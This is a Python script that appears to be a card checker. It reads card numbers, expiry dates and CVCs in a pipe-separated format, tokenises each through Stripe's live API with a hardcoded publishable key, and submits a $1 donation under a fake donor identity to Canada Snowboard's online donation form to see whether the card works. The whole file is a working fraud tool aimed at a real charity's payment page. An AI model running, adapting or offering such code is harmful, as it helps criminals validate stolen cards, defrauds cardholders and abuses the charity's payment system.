import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'key=pk_live_51LsTcMGXCOfsQVIW9dXATKGVOREgEjIs4daDD2QNr71WB2wnZdpVnR6sX4Y2YQ7lJWgFRPYGyT042P7PQ1QcDAw300GimtEWTe&payment_user_agent=stripe.js%2F78ef418&card[number]={n}&card[exp_month]={mm}&card[exp_year]=20{yy}&card[cvc]={cvc}'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	
	tok = response.json()['id']
	
	headers = {
	    'authority': 'www.canadasnowboard.ca',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.canadasnowboard.ca',
	    'referer': 'https://www.canadasnowboard.ca/en/partners/fundraising/givenow/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'stripeToken': f'{tok}',
	    'total': '1',
	    'amount_other': '1',
	    'association': 'National',
	    'designation': 'General',
	    'terms_1': 'I confirm that this donation is made voluntarily and unconditionally to Canada Snowboard to support Canadian athletes on their journey to the podium. I understand that Canada Snowboard can direct this donation to the initiative of their choice; however it is preferred that this donation be used to support the designation I\'ve indicated." ',
	    'name': 'Rodam User',
	    'organization': '',
	    'email': 'rodamuser08@gmail.com',
	    'phone': '4303000850',
	    'address': 'Street 27',
	    'city': 'New York',
	    'province': 'NY',
	    'postal_code': '10080',
	    'country': 'US',
	    'name_on_card': 'Dao Khao Saard',
	    'comments': '',
	    'terms_2': 'I understand that an official receipt for tax purposes will be issued in accordance with CRA\'s interpretation of "qualifying donations". I confirm that no benefit will accrue to me or any related party as a result of this contribution and that this donation does not reduce any obligations I am required to pay to Canada Snowboard for "non-qualifying" expenses such as membership/registration fees, travel and training expenses or other expenses I am normally required to pay. I also understand that misrepresentations of tax matters can result in civil penalties imposed against me.',
	}
	
	response = requests.post(
	    'https://www.canadasnowboard.ca/en/partners/fundraising/givenow/',
	    headers=headers,
	    data=data,
	)
	
	success = re.search(r"<h1>(.*?)!</h1>", response.text).group(1)
	
	return (success)
